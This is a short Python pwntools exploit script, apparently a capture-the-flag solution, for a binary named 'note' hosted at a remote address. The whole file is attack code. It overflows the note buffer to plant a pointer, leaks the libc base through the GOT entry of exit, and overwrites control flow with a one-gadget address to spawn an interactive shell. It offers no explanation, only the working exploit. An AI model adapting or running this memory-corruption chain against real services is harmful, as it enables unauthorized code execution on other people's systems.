#!/usr/bin/env python
from pwn import *

def note(data):
    s.sendlineafter('> ','1')
    if len(data) < 0x100:
        data += '\n'
    s.sendafter('Note:',data)

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process('./note', env = {'LD_PRELOAD': './libc.so.6'})
    else:
        s = remote('47.89.18.224', 10007)

    elf = ELF('./note')
    libc = ELF('./libc.so.6')

    p256s_addr = elf.search('%256s').next()

    s.sendlineafter('ID:','A')
    note(('A' * 0xa8 + p64(p256s_addr)).ljust(0x100,'A'))

    payload = ''
    payload += '\x02\0\0\0'
    payload += p64(p256s_addr)
    payload += p64(elf.got['exit'])
    s.sendlineafter('> ',payload)
    s.recvuntil('Note:')
    libc_base = u64(s.recvline(False).ljust(8,'\0')) - libc.symbols['exit']
    log.info('libc base: %#x' % libc_base)

    one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

    payload = ''
    payload += 'A' * 0x64
    payload += p64(libc_base + one_gadgets[1])
    s.sendlineafter('> ',payload)

    s.interactive()
